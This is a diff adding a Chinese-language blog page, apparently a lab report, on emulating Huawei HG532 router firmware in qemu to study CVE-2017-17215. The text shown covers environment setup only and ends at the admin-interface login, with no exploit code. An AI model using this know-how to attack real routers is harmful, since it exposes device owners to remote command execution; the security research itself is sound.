@@ -1,0 +1,1300 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-loading-bar.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="记录了关于HG532路由器模拟执行以及漏洞利用分析的过程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HG532固件模拟及漏洞分析">
+<meta property="og:url" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Cot287&#39;s Blog">
+<meta property="og:description" content="记录了关于HG532路由器模拟执行以及漏洞利用分析的过程">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217110215890.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217110258127.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217110522447.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217123359746.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217123746423.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217112449595.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217112525218.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217112658412.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217112832589.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217113206906.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217121429047.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217121538353.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217122001867.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217131826673.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217131936129.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217132236360.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217132428716.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217145033664.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217145324707.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217152812167.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217160536754.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217195825222.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217201033208.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217201401038.png">
+<meta property="og:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217202431328.png">
+<meta property="article:published_time" content="2024-12-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-18T00:37:11.809Z">
+<meta property="article:author" content="Cot287">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217110215890.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2024/12/18/网络设备/HG532固件模拟及漏洞分析/"/>
+
+
+
+
+
+  <title>HG532固件模拟及漏洞分析 | Cot287's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cot287's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cot287's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HG532固件模拟及漏洞分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2024-12-18T00:00:00+08:00">
+                2024-12-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  记录了关于HG532路由器模拟执行以及漏洞利用分析的过程
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="实验目的">实验目的</h3>
+<p>本实验是对华为 HG532
+系列路由器进行模拟执行及漏洞分析利用，通过本次实验掌握基于 qemu
+模拟器系统模式（system mode）的固件模拟方法，基于 qemu 模拟器实现 HG532
+系列路由器固件的模拟。学会使用 IDA
+等工具开展漏洞分析，分析(CVE-2017-17215)漏洞，并基于 python
+实现漏洞利用工具的开发，在过程中理解漏洞原理。</p>
+<h3 id="实验内容与要求">实验内容与要求</h3>
+<p>搭建 Ubantu+Binwalk+qemu 环境，提取 HG532eV100R001C01B020 固件，下载
+qemu 启动虚拟机所需要的 32 位的 MIPS 大端存储镜像，创建虚拟网桥，实现
+qemu 虚拟机内部和 Ubuntu 的通信，上传 HG532
+文件系统并挂载实现路由器模拟执行，分析漏洞成因，并编写 POC
+注入程序实现任意命令执行，最后提交实验报告。</p>
+<h3 id="实验原理与方法">实验原理与方法</h3>
+<h4 id="提取固件">提取固件</h4>
+<p>首先我们需要提前安装binwalk，这里不加赘述，详细安装过过程可以参考其他教程</p>
+<p>我们解压二进制文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me HG532eV100R001C01B020_upgrade_packet.bin</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217110215890.png"></p>
+<p>解压后主程序位于 squashfs-root/目录下</p>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217110258127.png"></p>
+<h4 id="下载qemu虚拟机">下载qemu虚拟机</h4>
+<p>使用下面命令安装；这里已经安装过了，显示如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y qemu binfmt-support qemu-user-static</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217110522447.png"></p>
+<h4 id="下载镜像">下载镜像</h4>
+<p>执行命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta</span><br></pre></td></tr></table></figure>
+<p>出现如下报错</p>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217123359746.png"></p>
+<p>修改/etc/resolv.conf文件，添加nameserver即可，下面给出两个通用的谷歌域名服务器，如果有自己解析服务器也可以换成自己的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/resolv.conf</span><br><span class="line">nameserver 8.8.8.8 #google域名服务器</span><br><span class="line">nameserver 8.8.4.4 #google域名服务器</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217123746423.png" alt style="zoom:50%;"></p>
+<p>重启虚拟机进行使用wget 命令，可以了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217112449595.png" alt style="zoom: 33%;"></p>
+<h4 id="配置网络创建网桥">配置网络，创建网桥</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bridge-utils</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217112525218.png" alt style="zoom: 33%;"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo brctl addbr Virbr0</span><br><span class="line">sudo ifconfig Virbr0 192.168.50.51/24 up</span><br><span class="line">ifconfig # 查看配置情况</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217112658412.png" alt style="zoom: 50%;"></p>
+<h4 id="创建-tap-接口添加到网桥">创建 tap 接口，添加到网桥</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install uml-utilities</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217112832589.png" alt style="zoom: 33%;"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo ifconfig tap0 192.168.50.52/24 up</span><br><span class="line">sudo brctl addif Virbr0 tap0</span><br><span class="line">ifconfig # 查看配置情况</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217113206906.png" alt style="zoom:50%;"></p>
+<h4 id="qemu-虚拟机配置">qemu 虚拟机配置</h4>
+<p>账号密码都为 root</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217121429047.png" alt style="zoom: 33%;"></p>
+<p>进入虚拟机后，配置 ip 地址，测试与主机的连通性</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.50.53/24 up</span><br><span class="line">ping 192.168.50.51 -c 3</span><br></pre></td></tr></table></figure>
+<p>如下图所示，网络成功连通</p>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217121538353.png"></p>
+<h4 id="搭建-hg532e-漏洞环境">搭建 HG532e 漏洞环境</h4>
+<p>回到主机中将 <code>squashfs-root</code>
+文件夹复制到虚拟机，根据提示输入密码 <code>root</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r squashfs-root/ root@192.168.50.53:~/ </span><br></pre></td></tr></table></figure>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217122001867.png"></p>
+<p>进入启动的虚拟机，挂载程序文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217131826673.png" alt style="zoom:50%;"></p>
+<p>启动 shell，注意：这个 shell 是用来后面改 IP 地址的，</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot squashfs-root sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217131936129.png" alt style="zoom:50%;"></p>
+<p>在 Ubuntu 里面再单独开一个终端，使用 ssh 连接上去通过 ssh
+启动的终端，启动路由器</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.50.53 </span><br><span class="line">chroot squashfs-root /bin/sh </span><br><span class="line">./bin/upnp </span><br><span class="line">./bin/mic</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217132236360.png" alt style="zoom:50%;"></p>
+<p>此时的虚拟机的路由 IP 已经发生了变化，ssh
+已经断开了，所以需要返回虚拟机的终端进行更改 IP 地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.50.53/24 up</span><br></pre></td></tr></table></figure>
+<p>这个时候在 Ubuntu 上使用浏览器访问路由器 eth0 的 IP 地址</p>
+<p>(192.168.50.53)，就可以登录进入管理界面</p>
